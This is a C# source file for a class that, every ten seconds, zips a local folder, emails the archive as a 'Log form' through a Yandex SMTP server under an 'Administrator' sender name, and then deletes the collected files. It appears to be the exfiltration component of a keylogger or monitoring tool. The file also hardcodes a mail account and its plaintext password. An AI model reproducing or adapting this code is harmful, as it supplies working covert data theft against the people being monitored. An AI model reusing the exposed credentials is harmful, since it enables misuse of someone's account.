using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.IO;
using System.Threading;
using Ionic.Zip;
using System.IO.Compression;
using System.Net.Mail;
using System.Windows.Forms;
using System.Timers;
using Timer = System.Timers.Timer;

namespace userControlProgram
{
    class MailSender
    {
        private static string _path;
        private static MailAddress _email;
        public static string ZipName = "C:\\Users\\Public\\" + DateTime.Now.Month + DateTime.Now.Day + DateTime.Now.Hour +
                         DateTime.Now.Minute + ".zip";
        public static void MainSenderFunc(string path, MailAddress email)
        {
            _path = path;
            _email = email;

        //    if (Package())
        //        SendPackage();
            Timer timerSender = new Timer(10000);
            timerSender.Start();
            timerSender.Elapsed += OnTimerTick;
        }

        private static bool Package()
        {
        //    string zipName = _path + "\\" + DateTime.Now.Month + DateTime.Now.Day + DateTime.Now.Hour + DateTime.Now.Minute + ".zip";
            try
            {
                using (ZipFile zip = new ZipFile()) // Создаем объект для работы с архивом
                {
                    zip.CompressionLevel = Ionic.Zlib.CompressionLevel.BestCompression;
                        // Задаем максимальную степень сжатия 
                    zip.AddDirectory(_path); // Кладем в архив папку вместе с содежимым
                    zip.Save(ZipName); // Создаем архив     
                }
            }
            catch
            {
                return false;
            }
            return true;
        }

        private static bool SendPackage()
        {
            // send mail
            try
            {
                SmtpClient client = new SmtpClient();
                client.Host = "smtp.yandex.ru";
                client.Credentials = new NetworkCredential("krypper@yandex.ru", "17kjvmzasd");

                MailMessage mailMessage = new MailMessage();
                mailMessage.From = new MailAddress("krypper@yandex.ru", "Administrator");
                mailMessage.Sender = new MailAddress("krypper@yandex.ru", "Administrator");
                mailMessage.To.Add(_email);
                mailMessage.Subject = "Log form " + DateTime.Now.DayOfWeek + ", " + DateTime.Now.Month + " " +
                                      DateTime.Now.Day + "; " + DateTime.Now.Hour + " hours.";
                mailMessage.Body = @"";
                mailMessage.IsBodyHtml = false;
                mailMessage.Priority = MailPriority.High;

                Attachment attachment = new Attachment(ZipName, System.Net.Mime.MediaTypeNames.Application.Zip);

                mailMessage.Attachments.Add(attachment);

                client.Send(mailMessage);
            }
            catch 
            {
                return false;
            }

            // delete package););
            try
            {
                DirectoryInfo dir = new DirectoryInfo(_path);
                FileInfo [] files = dir.GetFiles();

                foreach (var fileInfo in files)
                {
                    File.Delete(fileInfo.ToString());
                }
                File.Delete(ZipName);
            }
            catch
            {
                return false;
            }
            return true;
        }

        private static void OnTimerTick(object o, ElapsedEventArgs e)
        {
            Thread senderTread = new Thread(ManagerThread);
            senderTread.Start();
        }
        private static void ManagerThread()
        {
            if (Package())
                SendPackage();
        }
    }
}
